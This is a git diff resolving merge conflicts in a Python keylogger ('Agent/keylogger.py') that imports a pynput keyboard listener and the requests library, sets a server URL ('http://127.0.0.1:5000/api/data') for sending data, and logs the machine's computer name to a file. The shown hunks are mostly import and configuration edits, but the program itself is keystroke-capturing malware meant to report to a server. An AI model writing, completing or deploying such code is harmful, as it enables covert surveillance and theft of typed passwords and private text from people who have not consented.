@@ -6,11 +6,8 @@ import win32process
 from pynput.keyboard import Listener, Key
 import requests
 import datetime
-<<<<<<< HEAD:keylogger.py
-from keylogger.Encryption import encryption
-=======
+
 from Encryption import encryption
->>>>>>> main:Agent/keylogger.py
 
 
 def get_system_info():
@@ -195,22 +192,16 @@ class KeyLogger:
             listener.join()
 
 if __name__ == "__main__":
-<<<<<<< HEAD:keylogger.py
-    SERVER_URL = "https://fv"
-=======
     SERVER_URL = "http://127.0.0.1:5000/api/data"
->>>>>>> main:Agent/keylogger.py
     LOG_FILE = "a.txt"
 
     keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)
 
 
     system_info = get_system_info()
-<<<<<<< HEAD:keylogger.py
+
     system_info_line = f"[System Info] Computer Name: {system_info['computer_name']}\n"
-=======
-    system_info_line = f"[System Info] computer Name: {system_info['computer_name']}\n"
->>>>>>> main:Agent/keylogger.py
+
     keylogger.write_to_file(system_info_line)
     print(system_info_line)
 
